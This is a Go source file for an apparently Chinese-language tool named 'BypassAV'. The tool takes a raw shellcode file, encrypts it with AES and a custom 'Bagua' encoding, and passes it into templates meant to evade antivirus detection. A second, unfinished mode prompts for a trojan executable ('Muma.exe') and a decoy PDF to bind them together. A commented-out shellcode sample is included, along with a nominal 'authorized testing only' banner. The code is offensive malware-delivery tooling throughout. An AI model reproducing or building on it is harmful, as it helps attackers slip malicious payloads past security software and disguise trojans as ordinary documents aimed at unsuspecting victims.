package main

import (
	"BypassAV/In"
	"BypassAV/In/encrypt"
	"io/ioutil"

	"fmt"
)

var (
	path        = "payload.bin"
	enmode      = "AES"
	aesmode int = 1
	aeskey      = "happy@2022"
	tplname  	= "1"
	xid 	int = 1
	mfilename =  "Muma.exe"
	filename =   "1.pdf"
	//shellcode     = []byte{
	//	//calc.exe https://github.com/peterferrie/win-exec-calc-shellcode
	//	0x31, 0xc0, 0x50, 0x68, 0x63, 0x61, 0x6c, 0x63,
	//	0x54, 0x59, 0x50, 0x40, 0x92, 0x74, 0x15, 0x51,
	//	0x64, 0x8b, 0x72, 0x2f, 0x8b, 0x76, 0x0c, 0x8b,
	//	0x76, 0x0c, 0xad, 0x8b, 0x30, 0x8b, 0x7e, 0x18,
	//	0xb2, 0x50, 0xeb, 0x1a, 0xb2, 0x60, 0x48, 0x29,
	//	0xd4, 0x65, 0x48, 0x8b, 0x32, 0x48, 0x8b, 0x76,
	//	0x18, 0x48, 0x8b, 0x76, 0x10, 0x48, 0xad, 0x48,
	//	0x8b, 0x30, 0x48, 0x8b, 0x7e, 0x30, 0x03, 0x57,
	//	0x3c, 0x8b, 0x5c, 0x17, 0x28, 0x8b, 0x74, 0x1f,
	//	0x20, 0x48, 0x01, 0xfe, 0x8b, 0x54, 0x1f, 0x24,
	//	0x0f, 0xb7, 0x2c, 0x17, 0x8d, 0x52, 0x02, 0xad,
	//	0x81, 0x3c, 0x07, 0x57, 0x69, 0x6e, 0x45, 0x75,
	//	0xef, 0x8b, 0x74, 0x1f, 0x1c, 0x48, 0x01, 0xfe,
	//	0x8b, 0x34, 0xae, 0x48, 0x01, 0xf7, 0x99, 0xff,
	//	0xd7,
	//}
)

const Banner = ` 
     ██     ██     ██████    ██              ██████                                             
    ████   ░██    ░░░░░░█   █░█             ░█░░░░██   ██   ██ ██████                           
   ██░░██  ░██  ██     ░█  █ ░█             ░█   ░██  ░░██ ██ ░██░░░██  ██████    ██████  ██████
  ██  ░░██ ░██ ██      █  ██████            ░██████    ░░███  ░██  ░██ ░░░░░░██  ██░░░░  ██░░░░ 
 ██████████░████      █  ░░░░░█             ░█░░░░ ██   ░██   ░██████   ███████ ░░█████ ░░█████ 
░██░░░░░░██░██░██    █       ░█             ░█    ░██   ██    ░██░░░   ██░░░░██  ░░░░░██ ░░░░░██
░██     ░██░██░░██  █        ░█  █████ █████░███████   ██     ░██     ░░████████ ██████  ██████ 
░░      ░░ ░░  ░░  ░         ░  ░░░░░ ░░░░░ ░░░░░░░   ░░      ░░       ░░░░░░░░ ░░░░░░  ░░░░░░
Ver 1.0
[INFO]仅用于授权测试，严禁违法行为！

-h 查看帮助
`

func main() {
	fmt.Println(Banner)
	fmt.Println("[+]请选择服务项目 [默认免杀 1=免杀 2=捆绑]")
	fmt.Scanln(&xid)


	if xid == 1{
		fmt.Println("[+]请输入shellocde地址 [默认./payload.bin]")
		fmt.Scanln(&path)
		sc, err := ioutil.ReadFile(path)
		if err != nil || len(sc) == 0 {
			fmt.Println("[-]请检查输入的路径!")
			return
		}
		fmt.Println("[+]请输入免杀模板 [默认1，后期在加]")
		fmt.Scanln(&tplname)
		fmt.Println("[+]请输入加密方式 [默认AES，后期在加]")
		fmt.Scanln(&enmode)
		if enmode == "AES" {
			fmt.Println("[+]请输入AES加密方式 [默认1，1=Ecb 2=Cbc 3=Ctr 4=Cfb 5=Ofb]")
			fmt.Scanln(&aesmode)
			fmt.Println("[+]请输入自定义密钥 [默认 happy@2022]")
			fmt.Scanln(&aeskey)
			fmt.Println("开始制作------------------------->")
			fmt.Println("<-------------------------制作完成")
			Aes_go(sc, []byte(aeskey), aesmode,tplname)


		}

	}else if xid == 2{
		fmt.Println("[+]请输入Muma文件路径  [默认当前路径下 Muma.exe]")
		fmt.Scanln(&mfilename)
		fmt.Println("[+]请输入需要处理的文件 [默认当前路径下 1.pdf]")
		fmt.Scanln(&filename)


	}





}

////读取文件内容
//func ReadFile(filename *string) []byte {
//	str := *filename
//	f, _ := ioutil.ReadFile(str)
//	return f
//}

func Aes_go(sc, key []byte, keymode int ,tmpmode string) {

	enstr, _ := encrypt.Aes_en(sc, key, keymode)
	//destr:=encrypt.Aes_de(enstr,key,aes)

	s := encrypt.Bagua_en(enstr)
	//fmt.Printf("Aes 加密：%s\nAes 解密：%s\n八卦加密：%s\n八卦解密：%s\n",string(enstr),string(destr),s,string(j))

	//执行模板操作，参数1 加密内容 参数2 密钥 参数3 加密类型 参数4 模板
	In.Tpl_go(s,string(key),keymode,tmpmode)

}
